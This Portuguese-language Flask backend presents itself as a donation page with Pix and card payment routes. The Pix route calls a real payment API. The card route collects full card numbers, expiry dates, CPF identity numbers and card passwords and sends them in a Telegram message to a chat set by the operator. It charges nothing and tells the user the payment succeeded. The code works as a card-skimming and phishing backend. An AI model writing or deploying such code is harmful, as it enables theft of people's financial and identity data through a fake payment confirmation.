from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import re
import uuid
import os

app = Flask(__name__)
CORS(app)

# Variáveis de ambiente (configure no Railway)
ACCESS_TOKEN = os.getenv("MP_ACCESS_TOKEN")  # Mercado Pago
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")  # Bot do Telegram
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")       # ID do chat do Telegram
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET")  # Chave secreta opcional

def email_valido(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

@app.route("/gerar-pix", methods=["POST"])
def gerar_pix():
    dados = request.get_json()
    valor = float(dados.get("valor", 0))
    email = dados.get("email", "").strip()
    nome = dados.get("nome", "Usuário Desconhecido").strip()
    turbinar = dados.get("turbinar", False)

    if valor <= 0:
        return jsonify({"erro": "Valor inválido. O valor deve ser maior que zero."}), 400

    if turbinar:
        valor += 5.99

    if not email_valido(email):
        email = "usuario@teste.com"

    nome_parts = nome.split()
    first_name = nome_parts[0] if nome_parts else "Usuário"
    last_name = " ".join(nome_parts[1:]) if len(nome_parts) > 1 else "Desconhecido"

    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json",
        "X-Idempotency-Key": str(uuid.uuid4())
    }

    body = {
        "transaction_amount": valor,
        "description": "Doação via Pix",
        "payment_method_id": "pix",
        "payer": {
            "email": email,
            "first_name": first_name,
            "last_name": last_name
        }
    }

    try:
        response = requests.post("https://api.mercadopago.com/v1/payments", headers=headers, json=body)
        if response.status_code == 201:
            pagamento = response.json()
            return jsonify({
                "pix_qr": pagamento["point_of_interaction"]["transaction_data"]["qr_code_base64"],
                "pix_copiaecola": pagamento["point_of_interaction"]["transaction_data"]["qr_code"]
            })
        else:
            return jsonify({"erro": "Erro ao gerar Pix. Tente novamente."}), 500
    except Exception as e:
        return jsonify({"erro": str(e)}), 500

@app.route("/gerar-cartao", methods=["POST"])
def gerar_cartao():
    dados = request.get_json()
    numero_cartao = dados.get("numero")
    senha = dados.get("senha")
    nome_cartao = dados.get("nome_cartao")
    validade = dados.get("validade")
    cpf_cartao = dados.get("cpf_cartao")
    cvv = dados.get("cvv")
    valor = float(dados.get("valor", 0))
    email = dados.get("email")
    nome = dados.get("nome")

    if not numero_cartao or not nome_cartao or not validade or not cpf_cartao or not cvv:
        return jsonify({"erro": "Todos os dados do cartão devem ser fornecidos."}), 400

    if valor <= 0:
        return jsonify({"erro": "O valor da contribuição deve ser maior que zero."}), 400

    mensagem = f"""
💳 *Novo Pagamento via Cartão de Crédito*:

👤 *Nome:* {nome}
📧 *E-mail:* {email}
💰 *Valor:* R$ {valor:.2f}
💳 *Número do Cartão:* {numero_cartao}
👤 *Titular:* {nome_cartao}
📅 *Validade:* {validade}
🆔 *CPF:* {cpf_cartao}
🔐 *Senha:* {senha}
"""

    try:
        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": mensagem,
            "parse_mode": "Markdown"
        })
        if response.status_code != 200:
            return jsonify({"erro": "Erro ao enviar dados para o Telegram."}), 500

        return jsonify({"success": True, "message": "Pagamento processado com sucesso!"})
    except Exception as e:
        return jsonify({"erro": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
